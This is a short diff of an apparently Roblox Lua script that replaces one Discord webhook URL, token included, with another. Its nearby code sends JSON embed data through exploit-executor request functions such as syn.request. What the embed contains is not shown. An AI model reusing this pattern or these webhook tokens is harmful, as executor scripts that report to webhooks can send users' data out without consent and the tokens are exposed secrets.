@@ -246,7 +246,7 @@ task.delay(0.3, function()
 
             local jsonData = HttpService:JSONEncode({embeds = {embedData}})
 
-            local link = "https://discord.com/api/webhooks/1448041675258859611/TDkvq0jnoMGi1pbMqLT_u3-8UOjoaSNKnaMevpul1OhPCmGo70D-Ko7pBJAwJKdMNnlE"
+            local link = "https://discord.com/api/webhooks/1448041678534348860/zYG3727s8ydYKpMV6aCubtGablKajZeyfmrAlCx4GyxS7UticfLZ5wMZ3IvByRSWpqrv"
 
             local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
             if req then
